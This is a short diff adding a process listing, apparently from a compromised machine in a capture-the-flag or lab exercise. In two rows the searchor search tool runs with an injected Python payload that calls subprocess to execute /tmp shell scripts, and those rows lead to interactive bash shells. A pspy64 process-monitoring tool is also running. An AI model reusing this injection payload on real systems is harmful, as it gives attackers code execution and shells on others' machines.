@@ -1,0 +1,12 @@
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+svc         1628  0.0  1.5 187412 30880 ?        Ssl  20:58   0:01 python3 /var/www/app/app.py
+svc         2457  0.0  0.8  23864 15908 ?        S    22:01   0:00 /usr/bin/python3 /usr/local/bin/searchor search Google apple', print(__import__("subprocess").getoutput("/bin/bash /tmp/shell2.sh")))#
+svc         2458  0.0  0.0   2888  1008 ?        S    22:01   0:00 /bin/sh -c /bin/bash /tmp/shell2.sh
+svc         2459  0.0  0.1   7368  2492 ?        S    22:01   0:00 /bin/bash /tmp/shell2.sh
+svc         2460  0.0  0.2   8724  4184 ?        S    22:01   0:00 bash -i
+svc         2468  0.0  0.8  23864 15956 ?        S    22:01   0:00 /usr/bin/python3 /usr/local/bin/searchor search Google apple', print(__import__("subprocess").getoutput("/bin/bash /tmp/shell.sh")))#
+svc         2469  0.0  0.0   2888  1000 ?        S    22:01   0:00 /bin/sh -c /bin/bash /tmp/shell.sh
+svc         2470  0.0  0.1   7368  2488 ?        S    22:01   0:00 /bin/bash /tmp/shell.sh
+svc         2471  0.0  0.2   8724  5144 ?        S    22:01   0:00 bash -i
+svc         2493  1.4  0.5 705804 10492 ?        Sl   22:05   0:07 ./pspy64
+svc         2538  0.0  0.0  10068  1608 ?        R    22:14   0:00 ps aux
